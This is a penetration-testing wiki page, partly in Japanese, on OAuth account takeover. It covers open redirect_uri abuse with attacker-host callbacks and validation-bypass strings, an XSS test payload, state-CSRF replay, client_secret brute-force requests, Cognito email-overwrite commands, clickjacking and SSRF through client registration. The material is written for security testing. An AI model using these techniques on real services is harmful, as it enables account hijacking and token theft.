# OAuthを使ったアカウント乗っ取り

{{#include ../banners/hacktricks-training.md}}

## Basic Information <a href="#d4a8" id="d4a8"></a>

OAuthはいくつかのバージョンがあり、基礎的な情報は [OAuth 2.0 documentation](https://oauth.net/2/) で確認できます。本章は主に広く使われている [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/) に焦点を当て、**あるアプリケーションが他のアプリケーション上のユーザーのアカウントにアクセスしたり操作を行ったりできるようにする認可フレームワーク** を提供します（authorization server）。

仮にあなたのすべてのソーシャルメディア投稿（非公開のものを含む）を表示することを目的としたウェブサイト _**https://example.com**_ があるとします。これを実現するために OAuth 2.0 が使われます。_https://example.com_ はあなたのソーシャルメディア投稿へのアクセス許可を求めます。すると、_https://socialmedia.com_ 上に同意画面が表示され、**要求されている権限とそのリクエストを行う開発者** が示されます。あなたが許可すると、_https://example.com_ はあなたに代わってあなたの投稿に**アクセスする**ことができるようになります。

OAuth 2.0 フレームワーク内で次のコンポーネントを理解することが重要です:

- **resource owner**: リソース（例：ソーシャルメディアアカウントの投稿）へのアクセスを許可するあなた（**user/entity**）。
- **resource server**: アプリケーションが`access token`を`resource owner`の代わりに取得した後に、認証されたリクエストを処理する**サーバ**。例: **https://socialmedia.com**。
- **client application**: `resource owner`からの認可を求める**アプリケーション**。例: **https://example.com**。
- **authorization server**: `resource owner`の認証と認可が成功した後、`client application`に`access tokens`を発行する**サーバ**。例: **https://socialmedia.com**。
- **client_id**: アプリケーションの公開される一意の識別子。
- **client_secret:** アプリケーションとauthorization serverのみが知る秘密鍵で、`access_tokens`を生成するために用いられる。
- **response_type**: 要求する**トークンの種類**を指定する値（例: `code`）。
- **scope**: `client application`が`resource owner`に対して要求する**アクセスの範囲**。
- **redirect_uri**: 認可後にユーザーがリダイレクトされる**URL**。通常は事前登録されたリダイレクトURLと一致する必要がある。
- **state**: ユーザーがauthorization serverへリダイレクトされる際にデータを保持するためのパラメータ。CSRF保護機構として機能するため、一意性が重要。
- **grant_type**: 返されるトークンの種類やグラントタイプを示すパラメータ。
- **code**: authorization server から発行される認可コードで、client application が `client_id` と `client_secret` と共に `access_token` を取得するために使用する。
- **access_token**: `client application` が `resource owner` に代わって API リクエストを行う際に使用するトークン。
- **refresh_token**: ユーザーの再プロンプトなしに新しい`access_token`を取得するためにアプリケーションが使えるトークン。

### Flow

**実際の OAuth フロー**は次のように進行します:

1. あなたは [https://example.com](https://example.com) にアクセスし、「ソーシャルメディアと連携」ボタンを選択します。
2. サイトは https://example.com のアプリケーションがあなたの投稿にアクセスできるようにするための認可を求めて [https://socialmedia.com](https://socialmedia.com) にリクエストを送ります。リクエストは次のような構造になっています:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. 次に、同意画面が表示されます。
4. 承認後、ソーシャルメディアは `redirect_uri` に `code` と `state` パラメータを含むレスポンスを送信します:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com はこの `code` と `client_id`、`client_secret` を用いてサーバー側から `access_token` をあなたに代わって取得するリクエストを行い、あなたが同意した権限へのアクセスを可能にします:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Finally, the process concludes as https://example.com employs your `access_token` to make an API call to Social Media to access

## Vulnerabilities <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Per [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), the authorization server must redirect the browser only to **pre-registered, exact redirect URIs**. Any weakness here lets an attacker send a victim through a malicious authorization URL so that the IdP delivers the victim’s `code` (and `state`) straight to an attacker endpoint, who can then redeem it and harvest tokens.

Typical attack workflow:

1. Craft `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` and send it to the victim.
2. The victim authenticates and approves the scopes.
3. The IdP redirects to `attacker.tld/callback?code=<victim-code>&state=...` where the attacker logs the request and immediately exchanges the code.

Common validation bugs to probe:

- **No validation** – any absolute URL is accepted, resulting in instant code theft.
- **Weak substring/regex checks on the host** – bypass with lookalikes such as `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, or `match.com@evil.com`.
- **IDN homograph mismatches** – validation happens on the punycode form (`xn--`), but the browser redirects to the Unicode domain controlled by the attacker.
- **Arbitrary paths on an allowed host** – pointing `redirect_uri` to `/openredirect?next=https://attacker.tld` or any XSS/user-content endpoint leaks the code either through chained redirects, Referer headers, or injected JavaScript.
- **Directory constraints without normalization** – patterns like `/oauth/*` can be bypassed with `/oauth/../anything`.
- **Wildcard subdomains** – accepting `*.example.com` means any takeover (dangling DNS, S3 bucket, etc.) immediately yields a valid callback.
- **Non-HTTPS callbacks** – letting `http://` URIs through gives network attackers (Wi-Fi, corporate proxy) the opportunity to snatch the code in transit.

Also review auxiliary redirect-style parameters (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, etc.) and the OpenID discovery document (`/.well-known/openid-configuration`) for additional endpoints that might inherit the same validation bugs.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

As mentioned in this bug bounty report [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html) it might be possible that the redirect **URL is being reflected in the response** of the server after the user authenticates, being **vulnerable to XSS**. Possible payload to test:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - stateパラメータの不適切な取り扱い <a href="#bda5" id="bda5"></a>

`state` パラメータは Authorization Code フローの CSRF トークンです：クライアントはブラウザごとに**暗号学的にランダムな値**を生成し、そのブラウザだけが読める場所（cookie、local storage など）に保存し、認可リクエストで送信し、同じ値が返らないレスポンスは拒否する必要があります。値が静的、予測可能、任意、またはユーザセッションに紐づいていないと、攻撃者は自分の OAuth フローを完了して最終の `?code=` リクエストを取得（送信せずに）し、後で被害者のブラウザにそのリクエストを再生させることで、被害者アカウントが攻撃者の IdP プロファイルにリンクされます。

リプレイのパターンは常に同じです：

1. 攻撃者は自分のアカウントで IdP に認証し、`code`（および `state`）を含む最後のリダイレクトを傍受します。
2. そのリクエストを破棄して URL を保持し、後でリンク、iframe、自動送信フォームなどの CSRF プリミティブを悪用して被害者のブラウザに読み込ませます。
3. クライアントが `state` を強制しない場合、アプリは攻撃者の認可結果を受け入れ、攻撃者を被害者のアプリアカウントにログインさせます。

テスト時の `state` 取り扱いに関する実用的チェックリスト：

- **Missing `state` entirely** – パラメータが全く現れない場合、ログイン全体が CSRF の対象になります。
- **`state` not required** – 初期リクエストから `state` を削除してみてください。IdP がそれでもクライアントが受け入れるコードを発行するなら、その防御はオプトイン（任意）です。
- **Returned `state` not validated** – レスポンス内の値を改ざん（Burp、MITM プロキシ）してみてください。不一致の値を受け入れる場合、保存されたトークンが比較されていません。
- **Predictable or purely data-driven `state`** – 多くのアプリがリダイレクトパスや JSON ブロブをランダム性を混ぜずに `state` に詰め込み、攻撃者が有効な値を推測してフローをリプレイできるようにします。データをエンコードする前に常に強いエントロピーを前後に付加してください。
- **`state` fixation** – アプリがユーザに `state` 値を提供させ（例：作成した authorization URL 経由）フローの間それを再利用する場合、攻撃者は既知の値を固定化して被害者間で再利用できます。

PKCE は（特に public clients にとって）authorization code を code verifier にバインドすることで `state` を補完できますが、web クライアントは依然としてクロスユーザの CSRF/アカウント連携バグを防ぐために `state` を追跡する必要があります。

### 事前のアカウント乗っ取り <a href="#ebe4" id="ebe4"></a>

1. **Without Email Verification on Account Creation**: 攻撃者は被害者のメールを使って先回りしてアカウントを作成できます。後で被害者がサードパーティのサービスでログインすると、アプリはそのサードパーティアカウントを攻撃者が事前作成したアカウントに誤ってリンクし、不正アクセスを招く可能性があります。
2. **Exploiting Lax OAuth Email Verification**: 攻撃者はメールを検証しない OAuth サービスを利用し、自分で登録してからアカウントのメールを被害者のものに変更することがあります。この方法も第1のシナリオと同様に、不正アクセスのリスクがありますが、別の攻撃ベクターになります。

### 秘密情報の開示 <a href="#e177" id="e177"></a>

`client_id` は意図的に公開されていますが、**`client_secret` はエンドユーザに回復可能であってはなりません**。`client_secret` を **mobile APKs, desktop clients, or single-page apps** に埋め込む Authorization Code のデプロイは、パッケージをダウンロードできる誰にでもその認証情報を手渡すことになります。public clients を検査する際は常に次を行ってください：

- APK/IPA、desktop installer、または Electron アプリを展開して `client_secret`、JSON にデコードされる Base64 ブロブ、またはハードコーディングされた OAuth エンドポイントを grep します。
- バンドルされた設定ファイル（plist、JSON、XML）やデコンパイルされた文字列を確認してクライアント資格情報を探します。

攻撃者が秘密を抽出したら、あとは弱い `redirect_uri`、ログ等を介して任意の被害者の認可 `code` を盗むだけで、正当なアプリを介さずに `/token` に対して独立してアクセス/リフレッシュトークンを発行できます。public/native clients は **秘密を保持できない** と見なすべきで、静的な secret の代わりにインスタンスごとの code verifier を保持していることを示すために PKCE (RFC 7636) に頼るべきです。テスト時には PKCE が必須かどうか、バックエンドが `client_secret` または有効な `code_verifier` のどちらかが欠けているトークン交換を実際に拒否するかを確認してください。

### Client Secret Bruteforce

You can try to **bruteforce the client_secret** of a service provider with the identity provider in order to be try to steal accounts.\
The request to BF may look similar to:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer Header leaking Code + State

Once the client has the **code and state**, if it's **reflected inside the Referer header** when he browses to a different page, then it's vulnerable.

### Access Token Stored in Browser History

The core guarantee of the Authorization Code grant is that **access tokens never reach the resource owner’s browser**. When implementations leak tokens client-side, any minor bug (XSS, Referer leak, proxy logging) becomes instant account compromise. Always check for:

- **Tokens in URLs** – if `access_token` appears in the query/fragment, it lands in browser history, server logs, analytics, and Referer headers sent to third parties.
- **Tokens transiting untrusted middleboxes** – returning tokens over HTTP or through debugging/corporate proxies lets network observers capture them directly.
- **Tokens stored in JavaScript state** – React/Vue stores, global variables, or serialized JSON blobs expose tokens to every script on the origin (including XSS payloads or malicious extensions).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` retain tokens long after logout on shared devices and are script-accessible.

Any of these findings usually upgrades otherwise “low” bugs (like a CSP bypass or DOM XSS) into full API takeover because the attacker can simply read and replay the leaked bearer token.

### Everlasting Authorization Code

Authorization codes must be **short-lived, single-use, and replay-aware**. When assessing a flow, capture a `code` and:

- **Test the lifetime** – RFC 6749 recommends minutes, not hours. Try redeeming the code after 5–10 minutes; if it still works, the exposure window for any leaked code is excessive.
- **Test sequential reuse** – send the same `code` twice. If the second request yields another token, attackers can clone sessions indefinitely.
- **Test concurrent redemption/race conditions** – fire two token requests in parallel (Burp intruder, turbo intruder). Weak issuers sometimes grant both.
- **Observe replay handling** – a reuse attempt should not only fail but also revoke any tokens already minted from that code. Otherwise, a detected replay leaves the attacker’s first token active.

Combining a replay-friendly code with any `redirect_uri` or logging bug allows persistent account access even after the victim completes the legitimate login.

### Authorization/Refresh Token not bound to client

If you can get the **authorization code and use it with a different client then you can takeover other accounts**.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**この記事を確認**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

In this bug bounty report: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) you can see that the **token** that **AWS Cognito** gives back to the user might have **enough permissions to overwrite the user data**. Therefore, if you can **change the user email for a different user email**, you might be able to **take over** others accounts.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
For more detailed info about how to abuse AWS Cognito check [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### 他アプリのトークンの悪用 <a href="#bda5" id="bda5"></a>

As [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), OAuth フローで **token**（code ではなく）を受け取ることを想定している場合、トークンがそのアプリに属しているかを検証しないと脆弱になる可能性があります。

これは、**attacker** が自分のアプリに **application supporting OAuth and login with Facebook**（例）を作成できるためです。被害者がその **attackers application** で Facebook にログインすると、**attacker** は自分のアプリに渡されたユーザーの **OAuth token** を取得し、それを使って被害者の OAuth アプリにログインできる、ということです。

> [!CAUTION]
> したがって、もし **attacker** がユーザーを自分の OAuth アプリにアクセスさせることに成功すれば、token を期待し、かつその token が自分の app ID に対して発行されたかどうかをチェックしていないアプリケーションで被害者アカウントを乗っ取ることが可能になります。

### Two links & cookie <a href="#bda5" id="bda5"></a>

According to [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), victim に対して **returnUrl** が attackers ホストを指すページを開かせることが可能でした。この情報は **stored in a cookie (RU)** され、後のステップで **prompt** が **user** にその attackers ホストへアクセス権を与えるかどうかを **ask** します。

このプロンプトを回避するために、**returnUrl** を使ってこの RU cookie を設定する **Oauth flow** を開始するタブを開き、プロンプトが表示される前にそのタブを閉じ、RU の値がない新しいタブを開く、という手法が可能でした。そうすると **prompt won't inform about the attackers host** が表示されない一方で cookie は attackers ホストに設定されるため、リダイレクト時に **token will be sent to the attackers host** ことになります。

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

As explained in [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), 一部の OAuth 実装では **`prompt`** GET パラメータに None（**`&prompt=none`**）を指定することで、ユーザーが既にプラットフォームにログインしている場合に Web 上のプロンプトで確認を求められないようにできます。

### response_mode

As [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), `response_mode` パラメータを指定して、最終的な URL のどこに code を渡すかを制御できる場合があります:

- `response_mode=query` -> The code is provided inside a GET parameter: `?code=2397rf3gu93f`
- `response_mode=fragment` -> The code is provided inside the URL fragment parameter `#code=2397rf3gu93f`
- `response_mode=form_post` -> The code is provided inside a POST form with an input called `code` and the value
- `response_mode=web_message` -> The code is send in a post message: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

OAuth 同意／ログインダイアログは clickjacking の理想的なターゲットです: フレーム化が可能であれば、attacker は見た目をオーバーレイして本物のボタンを隠し、ユーザーをだまして危険なスコープを承認させたりアカウントをリンクさせたりできます。PoC を作るときは次を試してください:

1. IdP の authorization URL を `<iframe sandbox="allow-forms allow-scripts allow-same-origin">` 内にロードする。
2. 絶対配置や不透明度のトリックで偽ボタンを隠れた **Allow**/**Approve** コントロールと位置合わせする。
3. 任意でパラメータ（scopes, redirect URI）を事前に設定し、盗まれた承認が直ちに attacker に利益をもたらすようにする。

テスト時には IdP ページが `X-Frame-Options: DENY/SAMEORIGIN` または制限的な `Content-Security-Policy: frame-ancestors 'none'` のいずれかを返していることを確認してください。どちらもない場合は [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) のようなツールでリスクを実証し、victim がどれほど簡単に attacker のアプリを承認してしまうかを記録してください。追加のペイロード案については [Clickjacking](clickjacking.md) を参照してください。

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

According to [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), これは username と password で OAuth にログインできる OAuth フローです。この単純なフロー中にユーザーの行える全ての操作にアクセスできる token が返される場合、その token を使って 2FA をバイパスすることが可能です。

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

This [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) は、referrer の値を元に open redirect を悪用して OAuth を通じて ATO を達成する方法について述べています。攻撃の流れは次の通りです:

1. Victim が attacker のウェブページにアクセスする
2. Victim が悪意あるリンクを開き、opener が `response_type=id_token,code&prompt=none` を追加パラメータとして使い、referrer を attackers ウェブサイトにして Google OAuth フローを開始する
3. プロバイダが被害者を認可した後、opener は `redirect_uri` パラメータ（被害者のウェブ）に 30X コードで戻すが、このとき referer に攻撃者のウェブサイトが残る
4. 被害者のウェブサイトが referer を基に open redirect をトリガーして被害者を attackers サイトへリダイレクトすると、**`respose_type`** が **`id_token,code`** だったため、code は URL のフラグメントで攻撃者に送られ、攻撃者は被害者のサイトに対して Google 経由でアカウントを乗っ取ることができる

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **For further details of this technique.**

Dynamic Client Registration in OAuth は一見目立たないものの、Server-Side Request Forgery (SSRF) の重大なベクターとなり得ます。このエンドポイントは OAuth サーバーが client アプリケーションの詳細（攻撃に利用可能な URL を含む）を受け取るために存在します。

Key Points:

- **Dynamic Client Registration** はしばしば `/register` にマッピングされ、`client_name`、`client_secret`、`redirect_uris`、およびロゴや JSON Web Key Sets (JWKs) の URL といった情報を POST リクエストで受け取ります。
- この機能は **RFC7591** や **OpenID Connect Registration 1.0** の仕様に従っており、SSRF に脆弱なパラメータを含み得ます。
- 登録プロセスは次のような形でサーバーを SSRF に晒す可能性があります:
  - **`logo_uri`**: クライアントアプリのロゴ URL をサーバーが取得すると SSRF を引き起こしたり、URL の扱いが不適切だと XSS を招いたりします。
  - **`jwks_uri`**: クライアントの JWK ドキュメントへの URL。これが悪意あるものだとサーバーが攻撃者管理下のサーバーへアウトバウンドリクエストを発生させます。
  - **`sector_identifier_uri`**: `redirect_uris` の JSON 配列を参照する URI。サーバーがこれをフェッチすると SSRF の機会になります。
  - **`request_uris`**: クライアントの許可された request URI 一覧で、サーバーがこれらを認可開始時にフェッチする実装だと悪用され得ます。
  
Exploitation Strategy:

- `logo_uri`、`jwks_uri`、`sector_identifier_uri` のようなパラメータに悪意ある URL を入れて新しいクライアントを登録することで SSRF を誘発できます。
- `request_uris` を直接悪用する試みはホワイトリストで緩和されている場合が多いですが、事前に登録された attacker 管理下の `request_uri` を提供することで、認可フェーズで SSRF を誘発できる場合があります。

## OAuth providers Race Conditions

If the platform you are testing is an OAuth provider [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

In OAuth, the sub field uniquely identifies a user, but its format varies by Authorization Server. To standardize user identification, some clients use emails or user handles. However, this is risky because:

- Some Authorization Servers do not ensure that these properties (like email) remain immutable.
- In certain implementations—such as **"Login with Microsoft"**—the client relies on the email field, which is **user-controlled by the user in Entra ID** and not verified.
- An attacker can exploit this by creating their own Azure AD organization (e.g., doyensectestorg) and using it to perform a Microsoft login.
- Even though the Object ID (stored in sub) is immutable and secure, the reliance on a mutable email field can enable an account takeover (for example, hijacking an account like victim@gmail.com).

## Client Confusion Attack

In a **Client Confusion Attack**, an application using the OAuth Implicit Flow fails to verify that the final access token is specifically generated for its own Client ID. An attacker sets up a public website that uses Google’s OAuth Implicit Flow, tricking thousands of users into logging in and thereby harvesting access tokens intended for the attacker’s site. If these users also have accounts on another vulnerable website that does not validate the token's Client ID, the attacker can reuse the harvested tokens to impersonate the victims and take over their accounts.

## Scope Upgrade Attack

The **Authorization Code Grant** type involves secure server-to-server communication for transmitting user data. However, if the **Authorization Server** implicitly trusts a scope parameter in the Access Token Request (a parameter not defined in the RFC), a malicious application could upgrade the privileges of an authorization code by requesting a higher scope. After the **Access Token** is generated, the **Resource Server** must verify it: for JWT tokens, this involves checking the JWT signature and extracting data such as client_id and scope, while for random string tokens, the server must query the Authorization Server to retrieve the token’s details.

## Redirect Scheme Hijacking

In mobile OAuth implementations, apps use **custom URI schemes** to receive redirects with Authorization Codes. However, because multiple apps can register the same scheme on a device, the assumption that only the legitimate client controls the redirect URI is violated. On Android, for instance, an Intent URI like `com.example.app://` oauth is caught based on the scheme and optional filters defined in an app’s intent-filter. Since Android’s intent resolution can be broad—especially if only the scheme is specified—an attacker can register a malicious app with a carefully crafted intent filter to hijack the authorization code. This can **enable an account takeover** either through user interaction (when multiple apps are eligible to handle the intent) or via bypass techniques that exploit overly specific filters, as detailed by Ostorlab's assessment flowchart.



## References

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)

{{#include ../banners/hacktricks-training.md}}
